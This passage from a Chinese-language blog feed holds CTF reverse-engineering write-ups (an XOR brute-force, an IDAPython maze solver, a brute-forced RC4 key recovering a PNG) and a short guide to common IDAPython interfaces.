0x03, 0x04, 0x0A, 0x14, 0x49, 0x05, 0x57]</span></span><br><span class="line"><span class="comment"># j = 1</span></span><br><span class="line"><span class="comment"># a = [0x0A, 0x0D, 0x06, 0x1C, 0x1D, 0x05, 0x05, 0x5F, 0x0D, 0x03, 0x04, 0x0A, 0x14, 0x49, 0x05, 0x57]</span></span><br><span class="line"><span class="comment"># b = [0x00, 0x1B, 0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, 0x51, 0x4B, 0x4F, 0x57, 0x05, 0x54]</span></span><br><span class="line"><span class="comment"># c = b+a</span></span><br><span class="line"><span class="comment"># d = [0x0A, 0x0D, 0x06, 0x1C, 0x1D, 0x05, 0x05, 0x5F, 0x0D, 0x03, 0x04, 0x0A, 0x14, 0x49, 0x05, 0x57, 0x0A, 0x0D, 0x06, 0x1C, 0x1D, 0x05, 0x05, 0x5F, 0x0D, 0x03, 0x04, 0x0A, 0x14, 0x49, 0x05, 0x57, 0x00, 0x1B, 0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, 0x51, 0x4B, 0x4F, 0x57, 0x05, 0x54, 0x55, 0x03, 0x53, 0x57, 0x01, 0x03, 0x07, 0x04, 0x4A, 0x77, 0x0D,0x00, 0x1B, 0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, 0x51, 0x4B, 0x4F, 0x57, 0x05, 0x54]</span></span><br><span class="line"><span class="comment"># for i in range(len(d)-2,0,-1):</span></span><br><span class="line"><span class="comment">#     d[i] ^= d[(i+1)]</span></span><br><span class="line"><span class="comment"># pl(d)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l2 = [<span class="number">0x00</span>, <span class="number">0x1B</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x54</span>, <span class="number">0x4E</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x4B</span>, <span class="number">0x4F</span>, <span class="number">0x57</span>, <span class="number">0x05</span>, <span class="number">0x54</span>]</span><br><span class="line">l1 = [<span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x06</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x5F</span>, <span class="number">0x0D</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x0A</span>, <span class="number">0x14</span>, <span class="number">0x49</span>, <span class="number">0x05</span>, <span class="number">0x57</span>]</span><br><span class="line">l = l1+l2</span><br><span class="line"><span class="comment"># m = [0x0A, 0x0D, 0x06, 0x1C, 0x1A, 0x0E, 0x04, 0x18, 0x06, 0x10, 0x0B, 0x0A, 0x0D, 0x0A, 0x09, 0x12, 0x0D, 0x0F, 0x0A, 0x01, 0x1D, 0x1B, 0x1A, 0x08, 0x0C, 0x1B, 0x07, 0x0C, 0x0D, 0x1C, 0x59, 0x01, 0x02, 0x0B, 0x0A, 0x0B, 0x0C, 0x03, 0x02, 0x03, 0x4B, 0x77, 0x0D]</span></span><br><span class="line"><span class="comment"># j = 0</span></span><br><span class="line"><span class="comment"># for i in range(len(l)-1,-1,-1):</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pl(l)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(ord(&#x27;&#125;&#x27;)^0x77)</span></span><br><span class="line"><span class="comment"># print(chr(ord(&#x27;K&#x27;)^0x7D))</span></span><br><span class="line">k = [<span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x06</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x5F</span>, <span class="number">0x0D</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x0A</span>, <span class="number">0x14</span>, <span class="number">0x49</span>, <span class="number">0x05</span>, <span class="number">0x57</span>, <span class="number">0x00</span>, <span class="number">0x1B</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x54</span>, <span class="number">0x4E</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x4B</span>, <span class="number">0x4F</span>, <span class="number">0x57</span>, <span class="number">0x05</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x03</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0x4A</span>, <span class="number">0x77</span>]</span><br><span class="line">kk = k</span><br><span class="line">kb = kk[:]</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">    kk[<span class="built_in">len</span>(kk)-<span class="number">1</span>] = ch</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(kk)-<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        kk[i] ^= kk[i+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> kk[<span class="number">0</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>) <span class="keyword">and</span> kk[<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>):</span><br><span class="line">        pl(kk)</span><br><span class="line">    kk = kb[:]</span><br></pre></td></tr></table></figure><h3 id="tmaze">tmaze</h3><p>根据调试分析可以知道它是一个链表(?图)，有三个方向和3个标记。要走到最后一个v7的位置</p><p>node节点大概是</p><p><img src="https://s2.loli.net/2024/09/08/Cq5yrtOnwTAXvsY.png" alt="image-20240908215707302"></p><p>前三个是指针，后面的sign是三个方向是否可以通过的标记</p><p>bef指向前一个node<br>next指向下一个node<br>tride的指向没有看懂，但是这个指针是互指的</p><p><img src="https://s2.loli.net/2024/09/08/H1NhxZkWCRIsJ72.png" alt="image-20240908215931928"></p><p>初始化过程</p><p><img src="https://s2.loli.net/2024/09/08/O5GbkeMc2RqNS37.png" alt="image-20240908215956884"></p><p>检查输入过程</p><p>这个题当时被困在不会写idc脚本，最后学长告诉我idapython更方便，然后就试了一下idapython发现这个语法和python基本一样，感觉很爽，然后就把脚本搓出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, addr: <span class="built_in">int</span></span>):</span><br><span class="line">        self.addr = addr</span><br><span class="line">        self.x = <span class="built_in">int</span>(idc.get_qword(addr))</span><br><span class="line">        self.y = <span class="built_in">int</span>(idc.get_qword(addr + <span class="number">8</span>))</span><br><span class="line">        self.z = <span class="built_in">int</span>(idc.get_qword(addr + <span class="number">16</span>))</span><br><span class="line">        self.to_x = <span class="built_in">int</span>(idc.get_wide_byte(addr + <span class="number">24</span>)) == <span class="number">0</span></span><br><span class="line">        self.to_y = <span class="built_in">int</span>(idc.get_wide_byte(addr + <span class="number">25</span>)) == <span class="number">0</span></span><br><span class="line">        self.to_z = <span class="built_in">int</span>(idc.get_wide_byte(addr + <span class="number">26</span>)) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hash</span>(self.addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(other, Node):</span><br><span class="line">            <span class="keyword">return</span> self.addr == other.addr</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_next</span>(<span class="params">self, direction</span>):</span><br><span class="line">        <span class="keyword">if</span> direction == <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> self.to_x:</span><br><span class="line">            <span class="keyword">return</span> Node(self.x)</span><br><span class="line">        <span class="keyword">elif</span> direction == <span class="string">&#x27;y&#x27;</span> <span class="keyword">and</span> self.to_y:</span><br><span class="line">            <span class="keyword">return</span> Node(self.y)</span><br><span class="line">        <span class="keyword">elif</span> direction == <span class="string">&#x27;z&#x27;</span> <span class="keyword">and</span> self.to_z:</span><br><span class="line">            <span class="keyword">return</span> Node(self.z)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_way</span>(<span class="params">start, end, visited=<span class="literal">None</span>, path=<span class="string">&#x27;&#x27;</span>, path_length=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> visited <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        visited = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">if</span> path_length &gt; <span class="number">43</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">    visited.add(start)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> start == end:</span><br><span class="line">        <span class="keyword">return</span> path, path_length</span><br><span class="line">    shortest_path = <span class="literal">None</span></span><br><span class="line">    shortest_length = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> situation <span class="keyword">in</span> <span class="string">&#x27;xyz&#x27;</span>:</span><br><span class="line">        next_node = start.get_next(situation)</span><br><span class="line">        <span class="keyword">if</span> next_node <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> next_node <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">            new_path, new_length = find_way(next_node, end, visited.copy(), path + situation, path_length + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> new_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> new_length &lt; shortest_length:</span><br><span class="line">                shortest_path = new_path</span><br><span class="line">                shortest_length = new_length</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> shortest_path, shortest_length</span><br><span class="line"></span><br><span class="line">start_node = Node(<span class="number">0x1B7BA6315D0</span>)</span><br><span class="line">end_node = Node(<span class="number">0x1B7BA632180</span>)</span><br><span class="line">path, plength = find_way(start_node, end_node)</span><br><span class="line"><span class="built_in">print</span>(path)</span><br><span class="line"><span class="comment"># yzyzyzyzyyzxzyyyzxzyzxxxzxzyyyyyyyyzxzxzyy</span></span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get<span class="emphasis">_qword 获取对应地址的qword值</span></span><br><span class="line"><span class="emphasis">get_wide_</span>bytes 获取对应地址的bytes值</span><br></pre></td></tr></table></figure><p>比赛的时候没出，不知道最后是不是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;yzyzyzyzyyzxzyyyzxzyzxxxzxzyyyyyyyyzxzxzyy&#x27;</span></span><br><span class="line">uuid3_generated = uuid.uuid3(uuid.NAMESPACE_DNS, name)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> 安卓 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDApython常见接口</title>
      <link href="/posts/c52f1795.html"/>
      <url>/posts/c52f1795.html</url>
      
        <content type="html"><![CDATA[<p>IDA支持两种脚本语言，分别为IDC和IDApython。</p><p>IDC和C语言感觉差别较大，比如i++必须写成i = i + 1，感觉十分麻烦，同时还保留了花括号，有点离谱，解释语言还有一堆格式，又改了一些东西，太难用了。于是我尝试学习IDApython。<br>IDApyhon的好处在于它的语法和python一模一样，而通过<code>import idc.idc</code>就可以使用所有IDC可以使用的IDA的接口，其具体的接口定义在<code>IDA主目录\python\3</code>目录中，将其添加到工程目录，然后就可以引用其中的内容了（只看了8.3版本的）</p><p>其中的所有代码均需要在ida命令行或者脚本界面执行</p><p>参考：</p><p><a href="https://github.com/yanxxd/IDA/blob/master/IDAPython%E6%89%8B%E5%86%8C%E4%B8%AD%E6%96%87%E7%89%88.pdf">IDA/IDAPython手册中文版.pdf at master · yanxxd/IDA (github.com)</a></p><h3 id="对地址的读写接口">对地址的读写接口</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">get_wide_byte(addr)</span><br><span class="line">get_wide_word(addr)</span><br><span class="line">get_wide_dword(addr)</span><br><span class="line">get_qword(addr)</span><br><span class="line"><span class="comment"># 上面的分别读取目标地址的1，2，3，4字节，返回对应的值</span></span><br><span class="line">patch_byte(ea,x)</span><br><span class="line">patch_word(ea, x)</span><br><span class="line">patch_dword(ea, x)</span><br><span class="line">patch_qword(ea, x)</span><br><span class="line"><span class="comment"># 上面的分别修改对应ea的地址为x的值</span></span><br></pre></td></tr></table></figure><p>ea是IDA中的地址</p><p>其它的不同粒度的操作参考上面的pdf</p><h3 id="调试时获取寄存器的值">调试时获取寄存器的值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyDbgHook</span>(idaapi.DBG_Hooks):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dbg_bpt</span>(<span class="params">self, tid, ea</span>):</span><br><span class="line">        <span class="keyword">if</span> ea == <span class="number">0x4015c1</span>:</span><br><span class="line">            rdx = idc.get_reg_value(<span class="string">&quot;rdx&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;0x%x&quot;</span> % rdx)</span><br><span class="line">        <span class="comment"># Continue the execution</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Instantiate and hook the debugger</span></span><br><span class="line">debughook = MyDbgHook()</span><br><span class="line">debughook.hook()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add a breakpoint at 0x4015c1</span></span><br><span class="line">idaapi.add_bpt(<span class="number">0x4015c1</span>)</span><br></pre></td></tr></table></figure><p>重写dbg_bpt方法，使得执行到对应地址的时候打印出所有值</p><p>或者直接在断点condition的地方写print(RAX)</p><p>contidition写法，这种写法不会使断点命中，只会执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rax = idc.get_reg_value(<span class="string">&quot;rax&quot;</span>)</span><br><span class="line">func_name = idc.get_func_name(rax)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;func_name&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="IDA-appcall">IDA appcall</h3><p><a href="https://docs.hex-rays.com/user-guide/debugger/debugger-tutorials/appcall_primer#variadic-functions">Appcall 应用程序调用 |Hex-Rays 文档</a></p><p>通过CIL或脚本直接调用程序内的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MessageBoxW(<span class="number">0</span>i64, <span class="string">L&quot;ests&quot;</span>, <span class="string">L&quot;hello&quot;</span>, <span class="number">1u</span>);</span><br><span class="line">sub_7FF64FBD1910(<span class="string">&quot;HEllo&quot;</span>);</span><br></pre></td></tr></table></figure><p>类似于如上格式</p><p>在idapython中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> Appcall</span><br><span class="line">Appcall.MessageBoxW(0i64, L<span class="string">&quot;ests&quot;</span>, L<span class="string">&quot;hello&quot;</span>, 1u);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 工具 </category>
          
          <category> IDA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> 语言 </tag>
            
            <tag> ida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dasctf-re复现</title>
      <link href="/posts/9e273b7a.html"/>
      <url>/posts/9e273b7a.html</url>
      
        <content type="html"><![CDATA[<h2 id="wp">wp</h2><h3 id="pic">pic</h3><p>动调可知，就是一个异或加rc4，需要爆破5位的key</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;numeric&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">init_permutation</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">int</span>&gt;&amp; key)</span> </span>&#123;</span><br><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">S</span><span class="params">(<span class="number">256</span>)</span></span>;</span><br><span class="line">std::<span class="built_in">iota</span>(S.<span class="built_in">begin</span>(), S.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i) &#123;</span><br><span class="line">j = (j + S[i] + key[i % key.<span class="built_in">size</span>()]) % <span class="number">256</span>;</span><br><span class="line">std::<span class="built_in">swap</span>(S[i], S[j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> S;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; <span class="title">read_file</span><span class="params">(<span class="type">const</span> std::string&amp; filename)</span> </span>&#123;</span><br><span class="line"><span class="function">std::ifstream <span class="title">file</span><span class="params">(filename, std::ios::binary)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!file) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;无法打开文件！&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; <span class="title">buffer</span><span class="params">((std::istreambuf_iterator&lt;<span class="type">char</span>&gt;(file)), std::istreambuf_iterator&lt;<span class="type">char</span>&gt;())</span></span>;</span><br><span class="line">file.<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">const</span> std::string filename = <span class="string">&quot;C:\\工作区\\box\\ctf\\dasctf2024qiu\\re\\pic\\pic\\bak\\flag.png&quot;</span>;</span><br><span class="line"><span class="keyword">auto</span> buf = <span class="built_in">read_file</span>(filename);</span><br><span class="line"><span class="keyword">auto</span> bak = buf;</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; onkey;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> i1 = <span class="string">&#x27;0&#x27;</span>; i1 &lt;= <span class="string">&#x27;z&#x27;</span>; ++i1) &#123;</span><br><span class="line"><span class="keyword">if</span> (i1 &gt; <span class="string">&#x27;9&#x27;</span> &amp;&amp; i1 &lt; <span class="string">&#x27;a&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> i2 = <span class="string">&#x27;0&#x27;</span>; i2 &lt;= <span class="string">&#x27;z&#x27;</span>; ++i2) &#123;</span><br><span class="line"><span class="keyword">if</span> (i2 &gt; <span class="string">&#x27;9&#x27;</span> &amp;&amp; i2 &lt; <span class="string">&#x27;a&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> i3 = <span class="string">&#x27;0&#x27;</span>; i3 &lt;= <span class="string">&#x27;z&#x27;</span>; ++i3) &#123;</span><br><span class="line"><span class="keyword">if</span> (i3 &gt; <span class="string">&#x27;9&#x27;</span> &amp;&amp; i3 &lt; <span class="string">&#x27;a&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> i4 = <span class="string">&#x27;0&#x27;</span>; i4 &lt;= <span class="string">&#x27;z&#x27;</span>; ++i4) &#123;</span><br><span class="line"><span class="keyword">if</span> (i4 &gt; <span class="string">&#x27;9&#x27;</span> &amp;&amp; i4 &lt; <span class="string">&#x27;a&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> i5 = <span class="string">&#x27;0&#x27;</span>; i5 &lt;= <span class="string">&#x27;z&#x27;</span>; ++i5) &#123;</span><br><span class="line"><span class="keyword">if</span> (i5 &gt; <span class="string">&#x27;9&#x27;</span> &amp;&amp; i5 &lt; <span class="string">&#x27;a&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">buf = bak;</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; combination = &#123; i1, i2, i3, i4, i5 &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> xor_num = i2;</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; S = <span class="built_in">init_permutation</span>(combination);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">buf[i] ^= xor_num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, q = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (q &lt; <span class="number">4</span>) &#123;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">j = (S[i] + j) % <span class="number">256</span>;</span><br><span class="line">std::<span class="built_in">swap</span>(S[i], S[j]);</span><br><span class="line">buf[q] ^= S[(S[i] + S[j]) % <span class="number">256</span>] ^ <span class="number">0x11</span>;</span><br><span class="line">++q;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((buf[<span class="number">0</span>] == <span class="number">0x89</span>) &amp;&amp; (buf[<span class="number">1</span>] == <span class="number">0x50</span>) &amp;&amp; (buf[<span class="number">2</span>] == <span class="number">0x4e</span>) &amp;&amp; (buf[<span class="number">3</span>] == <span class="number">0x47</span>)) &#123;</span><br><span class="line">std::cout &lt;&lt; i1 &lt;&lt; i2 &lt;&lt; i3 &lt;&lt; i4 &lt;&lt; i5 &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"><span class="keyword">goto</span> A;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">A:</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;finished&quot;</span> &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>爆出来之后直接解密</p><h3 id="你这主函数保真吗">你这主函数保真吗</h3><p>直接调试,然后就是原题</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dct3</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">double</span>&gt;&amp; Y, std::vector&lt;<span class="type">double</span>&gt;&amp; X)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> N = Y.<span class="built_in">size</span>();</span><br><span class="line">X.<span class="built_in">resize</span>(N);</span><br><span class="line"></span><br><span class="line"><span 